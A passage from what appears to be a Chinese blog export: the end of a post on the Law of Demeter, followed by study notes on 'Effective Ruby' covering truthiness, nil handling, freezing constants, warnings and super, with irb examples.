<h3 id="迪米特法则-最少知识原则"><a href="#迪米特法则-最少知识原则" class="headerlink" title="迪米特法则(最少知识原则)"></a>迪米特法则(最少知识原则)</h3><p><strong>定义：</strong>如果两个类不必彼此直接通信，那么这两个类就不应该发生直接的相互作用，如果其中一个类需要调用另一个类的某个一个方法的话，可以通过第三者转发调用。</p>
<p>OOP中提供的类结构一个特点就是隐藏(封装)，每个类都应当尽量降低成员的访问权限。</p>
<p>这里举一个例子：租客，房东，中介。 当去掉中介这层当然没问题，但房东与租客直接沟通的话，成本大，且一旦一方失信或者违约，再去调整双方都要花费更多的时间，而通过引入中介，双方只需要和中介对接，如果出现问题，由中介进行调整，双方的损失也就降低了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="../../typora-user-images/image-20231223144432571.png" alt="image-20231223144432571"></p>
<p>通过面相对象的演化过程，我们能看到面向对象不是全新的概念，而是以之前技术为基础，对缺点进行补充，其中引入了新的结构来解决问题。</p>
<hr>
<p>本文学习自：</p>
<ul>
<li><a href="https://book.douban.com/subject/36085072/">面向对象是怎样工作的（第3版）</a></li>
<li><a href="https://book.douban.com/subject/36116620/">大话设计模式</a></li>
</ul>
]]></content>
      <categories>
        <category>演化过程系列</category>
      </categories>
      <tags>
        <tag>OOP</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>Effective Ruby</title>
    <url>//post/Ruby/Effective%20Ruby.html</url>
    <content><![CDATA[<h2 id="熟悉Ruby"><a href="#熟悉Ruby" class="headerlink" title="熟悉Ruby"></a>熟悉Ruby</h2><h3 id="第一条：ruby中的True与False"><a href="#第一条：ruby中的True与False" class="headerlink" title="第一条：ruby中的True与False"></a>第一条：ruby中的True与False</h3><ol>
<li>在Ruby中，除了<code>false</code>和<code>nil</code>，其他值都为<code>true</code>，包括数字0</li>
<li><code>true</code>和<code>false</code>并不是关键字，而是一个全局常量但不遵守命名规范和赋值规范<ol>
<li>不遵守命名规范是因为，它没有以<code>$</code>开头</li>
<li>不遵守赋值规范是因为，无法写<code>ture = something</code></li>
<li><code>true.class =&gt; TrueClass </code></li>
<li><code>false.class =&gt; FalseClass</code></li>
<li>既然不是关键字，true和false就有着对象方法</li>
</ol>
</li>
<li>如<code>false</code>和<code>nil</code>都代表 <code>false</code>，那我们怎么进行区分？<ol>
<li>这一点在表示配置信息对象中会贯穿始终，因为false一般代表禁用，nil代表未赋值，使用默认值等。</li>
<li>最简单的方式是 obj.nil? 判断是否为nil</li>
<li>还可以使用 false == obj 来进行判断，在一般常规语言中，我们倾向于把不变量放到左边，但这里我们有着功能性上的考虑，因为false是一个对象，而FalseClass定义了<code>==</code>方法，也就是说这里实际执行为 false.==(obj)。这也太牛逼了。比如一个类也定义了<code>==</code>方法，则可能就会出现混乱的样子，比如：<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Bad</span>
  <span class="token keyword">def</span> <span class="token operator">==</span> <span class="token punctuation">(</span>other<span class="token punctuation">)</span>
    <span class="token boolean">true</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token boolean">false</span> <span class="token operator">==</span> <span class="token class-name">Bad</span><span class="token punctuation">.</span><span class="token keyword">new</span>    <span class="token comment"># => false</span>
<span class="token class-name">Bad</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token operator">==</span> <span class="token boolean">false</span>    <span class="token comment"># => true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>从上面的例子中，我们可以看到方法名可以定义为 <code>==</code> ，那是否 <code>==</code>本身就不是一个关键词，而是每个对象继承Object#== 方法，然后每个类可以自己重新判断？</p>
</blockquote>
</li>
</ol>
</li>
</ol>
<p>确实是这样的，比如integer和string类都重写了 == 方法<br>这里需要注意：string类型并没有缓存，因为string是可变的，所以 “a”.object_id 每次执行都是不同的<br>integer则带有缓存，1000.object_id每次执行都是一致的。</p>
<blockquote>
<p>Object#== 方法默认比较的什么？</p>
</blockquote>
<p>比较的是两个值的引用是否一致，而看引用是否一致，就看 Object#object_id是否一致<br>需要注意类重写 == 方法的问题，根据上下文进行判断。</p>
<blockquote>
<p>Ruby中如果定义了一个同名方法和一个同名变量会怎么区分？</p>
</blockquote>
<p>变量的优先级更高</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">074</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span> <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">name</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">075</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span>   <span class="token string-literal"><span class="token string">"这是一个方法"</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">076</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token keyword">end</span>
<span class="token operator">=></span> <span class="token symbol">:name</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">077</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> name <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"这是一个局部变量"</span></span>
<span class="token operator">=></span> <span class="token string-literal"><span class="token string">"这是一个局部变量"</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">078</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> name
<span class="token operator">=></span> <span class="token string-literal"><span class="token string">"这是一个局部变量"</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">079</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> name<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">=></span> <span class="token string-literal"><span class="token string">"这是一个方法"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="第二条：所有对象的值都可能为-nil"><a href="#第二条：所有对象的值都可能为-nil" class="headerlink" title="第二条：所有对象的值都可能为 nil"></a>第二条：所有对象的值都可能为 nil</h3><p>在Ruby中有一个特点，就是<strong>鸭子类型(duck typing)<strong>，不同于静态语言的强制校验，比如为某个类的实例，某个接口的实例，Ruby更关注这个对象能做什么，如果它能嘎嘎叫，那它就是一个鸭子，这也就是</strong>接口高于类型，</strong>而鸭子类型也就意味着相比 <code>is_a?</code> 方法，我们更喜欢 <code>respond_to?</code> 方法，不过我们也很少用 <code>respond_to?</code> 而是直接调用目标方法，如果没有这个方法，则触发<code>NoMethodError</code>异常。这也就需要我们使用大量的测试来保证安全。但即便是通过测试，到正式环境中，我们也会发现问题：<code>undefined method &#39;fubar&#39; for nil:NilClass(NoMethodError)</code><br>又是臭名昭著的空指针问题，在写Java时，我们最常见的一个异常就是空指针问题，比如方法的调用者为nil，方法的入参为nil，方法的返回值为nil，这都是很难避免的。<br>作为检验是否为nil，最方便的方法就是nil?方法，当然nil在boolean上下文中，总是fales，所以下面的代码都是等价的</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">person<span class="token punctuation">.</span>save <span class="token keyword">if</span> person
person<span class="token punctuation">.</span>save <span class="token keyword">if</span> <span class="token operator">!</span>person<span class="token punctuation">.</span><span class="token keyword">nil</span><span class="token operator">?</span>
person<span class="token punctuation">.</span>save <span class="token keyword">unless</span> person<span class="token punctuation">.</span><span class="token keyword">nil</span><span class="token operator">?</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>将变量显式转为期望类型，比时刻担心nil要容易得多，尤其是在即使输出为nil，也应该产生结果的情况。这里Object定义的几个转化方法就能用上了：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">069</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token number">13.</span>to_s
<span class="token operator">=></span> <span class="token string-literal"><span class="token string">"13"</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">070</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token keyword">nil</span><span class="token punctuation">.</span>to_s
<span class="token operator">=></span> <span class="token string-literal"><span class="token string">""</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">071</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token keyword">nil</span><span class="token punctuation">.</span>to_a
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">072</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token keyword">nil</span><span class="token punctuation">.</span>to_i
<span class="token operator">=></span> <span class="token number">0</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">073</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token keyword">nil</span><span class="token punctuation">.</span>to_f
<span class="token operator">=></span> <span class="token number">0.0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果有多个值，则可以考虑Array提供优雅的方式，Array#compact去掉所有nil，并返回副本</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">080</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> name <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"a"</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"b"</span></span><span class="token punctuation">,</span><span class="token keyword">nil</span><span class="token punctuation">]</span><span class="token punctuation">.</span>compact<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">" "</span></span><span class="token punctuation">)</span>
<span class="token operator">=></span> <span class="token string-literal"><span class="token string">"a b"</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">081</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> name <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"a"</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"b"</span></span><span class="token punctuation">,</span><span class="token keyword">nil</span><span class="token punctuation">]</span><span class="token punctuation">.</span>compact
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"a"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"b"</span></span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">082</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> name <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"a"</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"b"</span></span><span class="token punctuation">,</span><span class="token keyword">nil</span><span class="token punctuation">]</span><span class="token punctuation">.</span>compact<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">""</span></span><span class="token punctuation">)</span>
<span class="token operator">=></span> <span class="token string-literal"><span class="token string">"ab"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="第四条：留神，常量是可变的"><a href="#第四条：留神，常量是可变的" class="headerlink" title="第四条：留神，常量是可变的"></a>第四条：留神，常量是可变的</h3><ol>
<li><p>总是将常量冻结，以防止被改变，虽然已大写字母开头代表为常量，但Ruby并不禁止修改常亮，所以需要冻结freeze</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">001</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> Name <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Tome"</span></span>
<span class="token operator">=></span> <span class="token string-literal"><span class="token string">"Tome"</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">002</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> Name<span class="token punctuation">.</span>concat<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"bye"</span></span><span class="token punctuation">)</span>
<span class="token operator">=></span> <span class="token string-literal"><span class="token string">"Tomebye"</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">003</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> Name<span class="token punctuation">.</span>freeze
<span class="token operator">=></span> <span class="token string-literal"><span class="token string">"Tomebye"</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">004</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> Name<span class="token punctuation">.</span>concat<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"bye"</span></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span>irb<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">4</span><span class="token symbol">:in</span> `concat<span class="token string-literal"><span class="token string">': can'</span></span>t modify frozen <span class="token builtin">String</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Tomebye"</span></span> <span class="token punctuation">(</span>FrozenError<span class="token punctuation">)</span>
        from <span class="token punctuation">(</span>irb<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">4</span><span class="token symbol">:in</span> `<span class="token operator">&lt;</span>main<span class="token operator">></span>'
        from <span class="token operator">/</span>opt<span class="token operator">/</span>homebrew<span class="token operator">/</span>lib<span class="token operator">/</span>ruby<span class="token operator">/</span>gems<span class="token operator">/</span><span class="token number">3.2</span><span class="token number">.0</span><span class="token operator">/</span>gems<span class="token operator">/</span>irb<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.4</span><span class="token operator">/</span>exe<span class="token operator">/</span>irb<span class="token operator">:</span><span class="token number">9</span><span class="token symbol">:in</span> `<span class="token operator">&lt;</span>top <span class="token punctuation">(</span>required<span class="token punctuation">)</span><span class="token operator">></span>'
        from <span class="token operator">/</span>opt<span class="token operator">/</span>homebrew<span class="token operator">/</span>opt<span class="token operator">/</span>ruby<span class="token operator">/</span>bin<span class="token operator">/</span>irb<span class="token operator">:</span><span class="token number">25</span><span class="token symbol">:in</span> `load'
        from <span class="token operator">/</span>opt<span class="token operator">/</span>homebrew<span class="token operator">/</span>opt<span class="token operator">/</span>ruby<span class="token operator">/</span>bin<span class="token operator">/</span>irb<span class="token operator">:</span><span class="token number">25</span><span class="token symbol">:in</span> `<span class="token operator">&lt;</span>main<span class="token operator">></span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>如果常量引用一个集合对象比如数组或散列，那么需要冻结集合以及所有元素</p>
</li>
</ol>
<p>错误：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">005</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"a"</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"b"</span></span><span class="token punctuation">]</span>
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"a"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"b"</span></span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">006</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> arr<span class="token punctuation">.</span>freeze
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"a"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"b"</span></span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">007</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> arr <span class="token operator">&lt;&lt;</span> <span class="token string-literal"><span class="token string">"c"</span></span>
<span class="token punctuation">(</span>irb<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">7</span><span class="token symbol">:in</span> `<span class="token operator">&lt;</span>main<span class="token operator">></span><span class="token string-literal"><span class="token string">': can'</span></span>t modify frozen <span class="token builtin">Array</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"a"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"b"</span></span><span class="token punctuation">]</span> <span class="token punctuation">(</span>FrozenError<span class="token punctuation">)</span>
        from <span class="token operator">/</span>opt<span class="token operator">/</span>homebrew<span class="token operator">/</span>lib<span class="token operator">/</span>ruby<span class="token operator">/</span>gems<span class="token operator">/</span><span class="token number">3.2</span><span class="token number">.0</span><span class="token operator">/</span>gems<span class="token operator">/</span>irb<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.4</span><span class="token operator">/</span>exe<span class="token operator">/</span>irb<span class="token operator">:</span><span class="token number">9</span><span class="token symbol">:in</span> `<span class="token operator">&lt;</span>top <span class="token punctuation">(</span>required<span class="token punctuation">)</span><span class="token operator">></span>'
        from <span class="token operator">/</span>opt<span class="token operator">/</span>homebrew<span class="token operator">/</span>opt<span class="token operator">/</span>ruby<span class="token operator">/</span>bin<span class="token operator">/</span>irb<span class="token operator">:</span><span class="token number">25</span><span class="token symbol">:in</span> `load'
        from <span class="token operator">/</span>opt<span class="token operator">/</span>homebrew<span class="token operator">/</span>opt<span class="token operator">/</span>ruby<span class="token operator">/</span>bin<span class="token operator">/</span>irb<span class="token operator">:</span><span class="token number">25</span><span class="token symbol">:in</span> `<span class="token operator">&lt;</span>main<span class="token operator">></span>'
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">008</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> tmp <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token operator">=></span> <span class="token string-literal"><span class="token string">"a"</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">009</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> tmp<span class="token punctuation">.</span>concat <span class="token string-literal"><span class="token string">"b"</span></span>
<span class="token operator">=></span> <span class="token string-literal"><span class="token string">"ab"</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">010</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> arr
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"ab"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"b"</span></span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>正确：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">001</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"a"</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"b"</span></span><span class="token punctuation">]</span>
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"a"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"b"</span></span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">002</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> arr<span class="token punctuation">.</span>map<span class="token operator">!</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token symbol">:freeze</span><span class="token punctuation">)</span><span class="token punctuation">.</span>freeze
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"a"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"b"</span></span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">003</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> tmp <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token operator">=></span> <span class="token string-literal"><span class="token string">"a"</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">004</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> tmp<span class="token punctuation">.</span>frozen<span class="token operator">?</span>
<span class="token operator">=></span> <span class="token boolean">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="3">
<li><p>要防止常量被重新赋值，可以冻结定义它的模块儿或类（需要注意的一点，类名，模块儿名本质上就是一个常量）</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">011</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span> <span class="token keyword">class</span> <span class="token class-name">Base</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">012</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span>   Name <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Tom"</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">013</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token keyword">end</span>
<span class="token operator">=></span> <span class="token string-literal"><span class="token string">"Tom"</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">014</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> Base<span class="token punctuation">.</span>freeze
<span class="token operator">=></span> Base
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">015</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span> <span class="token keyword">class</span> <span class="token class-name">Base</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">016</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span>   Name <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Jack"</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">017</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token keyword">end</span>
<span class="token punctuation">(</span>irb<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">16</span><span class="token symbol">:in</span> `<span class="token operator">&lt;</span><span class="token keyword">class</span><span class="token symbol">:Base</span><span class="token operator">></span><span class="token string-literal"><span class="token string">': can'</span></span>t modify frozen <span class="token comment">#&lt;Class:Base>: Base (FrozenError)</span>
        from <span class="token punctuation">(</span>irb<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">15</span><span class="token symbol">:in</span> `<span class="token operator">&lt;</span>main<span class="token operator">></span>'
        from <span class="token operator">/</span>opt<span class="token operator">/</span>homebrew<span class="token operator">/</span>lib<span class="token operator">/</span>ruby<span class="token operator">/</span>gems<span class="token operator">/</span><span class="token number">3.2</span><span class="token number">.0</span><span class="token operator">/</span>gems<span class="token operator">/</span>irb<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.4</span><span class="token operator">/</span>exe<span class="token operator">/</span>irb<span class="token operator">:</span><span class="token number">9</span><span class="token symbol">:in</span> `<span class="token operator">&lt;</span>top <span class="token punctuation">(</span>required<span class="token punctuation">)</span><span class="token operator">></span>'
        from <span class="token operator">/</span>opt<span class="token operator">/</span>homebrew<span class="token operator">/</span>opt<span class="token operator">/</span>ruby<span class="token operator">/</span>bin<span class="token operator">/</span>irb<span class="token operator">:</span><span class="token number">25</span><span class="token symbol">:in</span> `load'
        from <span class="token operator">/</span>opt<span class="token operator">/</span>homebrew<span class="token operator">/</span>opt<span class="token operator">/</span>ruby<span class="token operator">/</span>bin<span class="token operator">/</span>irb<span class="token operator">:</span><span class="token number">25</span><span class="token symbol">:in</span> `<span class="token operator">&lt;</span>main<span class="token operator">></span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="第五条留意运行时警告"><a href="#第五条留意运行时警告" class="headerlink" title="第五条留意运行时警告"></a>第五条留意运行时警告</h3></li>
<li><p>使用命令行选项 “-w” 运行Ruby解释器以启动编译时和运行时的警告，设置环境变量RUBYOPT为 “-w” 是一样的</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ruby <span class="token parameter variable">-w</span> demo.rb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>设置**$VERBOSE=true<strong>，如果必须禁用运行时警告，可以临时将</strong>$VERBOSE=nil**</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Mac中使用：
<span class="token number">1</span>. launchctl setenv RUBYOPT <span class="token parameter variable">-Ku</span>
<span class="token number">2</span>. 关闭终端
<span class="token number">3</span>. 使用irb执行puts ENV<span class="token punctuation">[</span><span class="token string">'RUBYOPT'</span><span class="token punctuation">]</span>，看是否生效<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>第一条，第二条规则都有必要使用</p>
<h2 id="类，对象，模块"><a href="#类，对象，模块" class="headerlink" title="类，对象，模块"></a>类，对象，模块</h2><h3 id="第六条：类的继承关系"><a href="#第六条：类的继承关系" class="headerlink" title="第六条：类的继承关系"></a>第六条：类的继承关系</h3><p>可以看到所有的类都是Class类的实例，包括Class本身<br>而superclass的最顶部是BasicObject，再往上就没有了</p>
<img src="../../typora-user-images/yuque_mind.jpeg" style="zoom:50%;" /></li>
</ol>
<blockquote>
<p>从图中我们无法察觉到缺少了一个关键元素：<strong>单例类</strong></p>
</blockquote>
<p>当包含模块时Ruby就会悄悄的创建单例类，并将其插入到继承体系中，包含到类的上方（仅 include 模块时）</p>
<blockquote>
<p>函数调用寻找</p>
</blockquote>
<p><img src="../../typora-user-images/yuque_mind%20(1).jpeg" alt="yuque_mind (1)"></p>
<h3 id="第七条：了解supper的不同行为"><a href="#第七条：了解supper的不同行为" class="headerlink" title="第七条：了解supper的不同行为"></a>第七条：了解supper的不同行为</h3><ol>
<li>通过<code>super()</code>可以调用祖先链中上一层定义的该方法<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">001</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span> <span class="token keyword">class</span> <span class="token class-name">Human</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">002</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span>   <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">hi</span></span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">003</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span>     p <span class="token string-literal"><span class="token string">"Hello </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">context</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">004</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span>   <span class="token keyword">end</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">005</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token keyword">end</span>
<span class="token operator">=></span> <span class="token symbol">:hi</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">006</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">*</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token operator">&lt;</span> Human
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">007</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span>   <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">hi</span></span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
